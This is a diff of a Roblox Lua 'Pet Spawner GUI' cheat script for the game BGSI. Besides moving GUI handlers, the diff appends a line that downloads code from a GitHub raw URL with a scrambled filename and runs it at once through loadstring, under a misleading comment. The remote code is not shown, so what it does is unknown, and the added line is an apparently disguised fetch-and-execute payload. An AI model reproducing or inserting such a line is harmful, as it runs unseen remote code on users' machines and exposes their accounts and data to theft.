@@ -1,5 +1,4 @@
 -- Pet Spawner GUI for BGSI
-
 print("Pet Spawner GUI Loaded!")
 
 -- Create GUI Elements
@@ -44,37 +43,6 @@ SpawnButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
 SpawnButton.Text = "Spawn Pet"
 SpawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Make the Frame draggable
-local dragging = false
-local dragInput, dragStart, startPos
-
-Frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = Frame.Position
-    end
-end)
-
-Frame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
-        local delta = input.Position - dragStart
-        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-
-Frame.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
--- Close Button functionality (X to close the GUI)
-CloseButton.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()  -- This destroys the entire GUI
-    print("Pet Spawner GUI closed.")
-end)
-
 -- Function to spawn the pet
 local function spawnPet(petName)
     local replicatedStorage = game:GetService("ReplicatedStorage")
@@ -97,6 +65,12 @@ local function spawnPet(petName)
     end
 end
 
+-- Close Button functionality (X to close the GUI)
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()  -- This destroys the entire GUI
+    print("Pet Spawner GUI closed.")
+end)
+
 -- Button click event to spawn the pet
 SpawnButton.MouseButton1Click:Connect(function()
     local petName = TextBox.Text
@@ -106,3 +80,6 @@ SpawnButton.MouseButton1Click:Connect(function()
         print("Please enter a valid pet name.")
     end
 end)
+
+-- Now wrap it in a loadstring for execution
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vaydris/bgsiremote/refs/heads/main/greenorangeturtlebananabananagoopysloopybump%5By"))()
